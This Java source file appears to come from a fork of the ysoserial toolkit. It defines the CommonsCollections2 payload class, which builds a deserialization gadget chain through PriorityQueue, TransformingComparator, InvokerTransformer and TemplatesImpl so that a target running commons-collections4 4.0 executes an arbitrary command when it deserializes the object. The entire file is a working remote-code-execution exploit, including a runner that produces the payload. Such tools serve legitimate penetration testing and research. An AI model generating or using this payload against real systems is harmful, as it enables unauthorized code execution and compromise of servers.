package org.erosion2020.payloads;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.erosion2020.payloads.annotation.Authors;
import org.erosion2020.payloads.annotation.Dependencies;
import org.erosion2020.util.Gadgets;
import org.erosion2020.util.PayloadRunner;
import org.erosion2020.util.Reflections;

import java.util.PriorityQueue;
import java.util.Queue;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Authors({ Authors.FROHOFF })
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
		// stub data for replacement later
		queue.add(1);
		queue.add(1);

		// switch method called by comparator
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = 1;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections2.class, args);
	}

}
